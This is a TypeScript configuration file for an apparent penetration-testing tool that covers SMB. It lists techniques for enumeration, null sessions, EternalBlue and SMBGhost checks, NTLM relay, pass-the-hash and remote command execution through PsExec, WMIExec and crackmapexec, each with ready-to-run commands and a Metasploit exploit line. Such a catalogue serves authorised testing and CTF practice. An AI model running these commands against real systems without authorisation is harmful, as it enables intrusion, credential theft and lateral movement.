/**
 * SMB Service Configuration
 * Server Message Block / CIFS file sharing
 * 
 * @version 1.0.0
 * @author Security Team
 */
import type { ServiceConfig } from '../types';

export const smbConfig: ServiceConfig = {
  id: 'smb',
  name: 'SMB (Server Message Block)',
  description: 'SMB/CIFS - сетевой протокол для совместного доступа к файлам, принтерам и другим ресурсам. Широко используется в Windows-средах, также поддерживается Samba на Linux. Часто является вектором атаки из-за большого количества уязвимостей.',
  categoryId: 'remote-access',
  version: '1.0.0',
  tags: ['remote-access', 'file-sharing', 'windows', 'samba', 'lateral-movement'],

  matchers: {
    serviceNames: ['microsoft-ds', 'smb', 'samba', 'netbios-ssn', 'cifs'],
    cpePatterns: ['cpe:/a:microsoft:smb', 'cpe:/a:samba:samba', 'cpe:/o:microsoft:windows'],
    bannerRegex: [
      'SMB\\s*[\\d.]+',
      'Windows\\s+(Server|XP|7|8|10|11)',
      'Domain\\s+Name',
      'OS:\\s*Windows',
      'Samba\\s+[\\d.]+',
    ],
    productPatterns: ['Samba', 'Windows', 'Microsoft SMB', 'lanman'],
    standardPorts: [139, 445],
    nseScriptMatchers: [
      { scriptName: 'smb-os-discovery', outputPattern: '.' },
      { scriptName: 'smb-protocols', outputPattern: '.' },
      { scriptName: 'smb-security-mode', outputPattern: '.' },
    ],
  },

  confidenceThreshold: 30,

  techniques: [
    {
      id: 'smb-enum-shares',
      name: 'Share Enumeration',
      mitreId: 'T1135',
      description: 'Перечисление сетевых шар SMB. Позволяет обнаружить доступные ресурсы, включая скрытые административные шары (C$, ADMIN$, IPC$).',
      commands: [
        { tool: 'nmap', command: 'nmap -p 445 --script smb-enum-shares <target>', description: 'Enumeration SMB шар' },
        { tool: 'smbclient', command: 'smbclient -L //target -N', description: 'Листинг шар без аутентификации' },
        { tool: 'crackmapexec', command: 'crackmapexec smb <target> --shares', description: 'CME enumeration шар' },
        { tool: 'smbmap', command: 'smbmap -H <target>', description: 'SMBMap enumeration' },
      ],
      nseScripts: [
        { name: 'smb-enum-shares', description: 'Перечисление SMB шар', safe: true },
      ],
      difficulty: 'easy',
      tags: ['enumeration', 'shares', 'reconnaissance'],
    },
    {
      id: 'smb-enum-users',
      name: 'User/Group Enumeration',
      mitreId: 'T1087.002',
      description: 'Перечисление пользователей и групп домена через SMB. Раскрывает информацию об учетных записях для последующих атак.',
      commands: [
        { tool: 'nmap', command: 'nmap -p 445 --script smb-enum-users <target>', description: 'Enumeration пользователей SMB' },
        { tool: 'enum4linux', command: 'enum4linux -a <target>', description: 'Комплексное SMB enumeration' },
        { tool: 'crackmapexec', command: 'crackmapexec smb <target> --users', description: 'CME user enumeration' },
        { tool: 'rpcclient', command: 'rpcclient -U "" -N <target> -c "enumdomusers"', description: 'RPC user enumeration' },
      ],
      nseScripts: [
        { name: 'smb-enum-users', description: 'Перечисление пользователей через SMB', safe: true },
      ],
      difficulty: 'easy',
      tags: ['enumeration', 'users', 'domain'],
    },
    {
      id: 'smb-null-session',
      name: 'Null Session Attack',
      description: 'Подключение к SMB без аутентификации (anonymous/guest). Позволяет получить значительный объем информации о системе и домене.',
      commands: [
        { tool: 'rpcclient', command: 'rpcclient -U "" -N <target>', description: 'Подключение с null-сессией' },
        { tool: 'smbclient', command: 'smbclient -L //target -N', description: 'Anonymous листинг' },
        { tool: 'enum4linux', command: 'enum4linux -n <target>', description: 'Проверка null sessions' },
        { tool: 'crackmapexec', command: 'crackmapexec smb <target> -u \'\' -p \'\'', description: 'CME null auth check' },
      ],
      difficulty: 'easy',
      tags: ['enumeration', 'anonymous', 'misconfiguration'],
    },
    {
      id: 'smb-vulnerabilities',
      name: 'Critical SMB Vulnerabilities',
      description: 'Эксплуатация критических уязвимостей в SMB: EternalBlue, SMBGhost, PrintNightmare.',
      cves: [
        { cveId: 'CVE-2017-0144', cvss: 8.1, description: 'EternalBlue - MS17-010 RCE', exploitAvailable: true },
        { cveId: 'CVE-2020-0796', cvss: 8.8, description: 'SMBGhost - SMBv3 RCE', exploitAvailable: true },
        { cveId: 'CVE-2021-1675', cvss: 7.8, description: 'PrintNightmare - RCE via Print Spooler', exploitAvailable: true },
        { cveId: 'CVE-2021-34527', cvss: 8.8, description: 'PrintNightmare variant', exploitAvailable: true },
      ],
      commands: [
        { tool: 'nmap', command: 'nmap -p 445 --script smb-vuln-ms17-010 <target>', description: 'Проверка MS17-010' },
        { tool: 'nmap', command: 'nmap -p 445 --script smb-vuln-cve-2020-0796 <target>', description: 'Проверка SMBGhost' },
        { tool: 'crackmapexec', command: 'crackmapexec smb <target> -d domain -u user -p pass -M zerologon', description: 'ZeroLogon check' },
        { tool: 'metasploit', command: 'use exploit/windows/smb/ms17_010_eternalblue', description: 'EternalBlue exploit' },
      ],
      nseScripts: [
        { name: 'smb-vuln-ms17-010', description: 'Проверка EternalBlue', safe: true },
        { name: 'smb-vuln-cve-2020-0796', description: 'Проверка SMBGhost', safe: true },
      ],
      difficulty: 'medium',
      tags: ['vulnerability', 'rce', 'critical'],
    },
    {
      id: 'smb-relay',
      name: 'SMB Relay Attack',
      mitreId: 'T1187',
      description: 'Ретрансляция NTLM-аутентификации для получения доступа к другим системам без знания пароля.',
      commands: [
        { tool: 'responder', command: 'responder -I eth0', description: 'Захват NTLM хэшей' },
        { tool: 'ntlmrelayx', command: 'ntlmrelayx.py -tf targets.txt -smb2support', description: 'SMB relay attack' },
        { tool: 'crackmapexec', command: 'crackmapexec smb <target> -u user -H LMHASH:NTHASH', description: 'Pass-the-hash' },
      ],
      difficulty: 'medium',
      prerequisites: ['Позиция в сети (MITM)', 'Список целей без SMB signing'],
      tags: ['relay', 'ntlm', 'lateral-movement'],
    },
    {
      id: 'smb-psexec',
      name: 'PsExec / WMI Execution',
      mitreId: 'T1021.002',
      description: 'Удаленное выполнение команд через SMB с использованием PsExec или WMI. Требует административных привилегий.',
      commands: [
        { tool: 'psexec', command: 'psexec.py domain/user:password@target', description: 'Impacket PsExec' },
        { tool: 'wmiexec', command: 'wmiexec.py domain/user:password@target', description: 'Impacket WMIExec' },
        { tool: 'smbexec', command: 'smbexec.py domain/user:password@target', description: 'Impacket SMBExec' },
        { tool: 'crackmapexec', command: 'crackmapexec smb <target> -u admin -p pass -x "whoami"', description: 'CME command execution' },
      ],
      difficulty: 'medium',
      prerequisites: ['Административные привилегии', 'Доступ к ADMIN$'],
      tags: ['execution', 'lateral-movement', 'post-exploitation'],
    },
  ],

  triggers: [
    {
      techniqueId: 'smb-vulnerabilities',
      conditions: [
        { type: 'nse_output', operator: 'contains', value: 'VULNERABLE', field: 'smb-vuln-ms17-010' },
        { type: 'version', operator: 'regex', value: 'Windows Server 2008|Windows 7' },
      ],
    },
    {
      techniqueId: 'smb-null-session',
      conditions: [
        { type: 'nse_output', operator: 'contains', value: 'Message signing: disabled', field: 'smb-security-mode' },
      ],
    },
  ],

  ui: {
    icon: 'hard-drive',
    color: '#3b82f6',
    displayPriority: 95,
  },

  references: [
    { title: 'SMB Penetration Testing', url: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-smb' },
    { title: 'Samba Security', url: 'https://www.samba.org/samba/security/' },
  ],

  notes: 'SMB критически важен для Windows-сред. Всегда проверяйте MS17-010 (EternalBlue), SMB signing status и null sessions. В CTF часто содержит флаги в скрытых шарах.',
};

export default smbConfig;
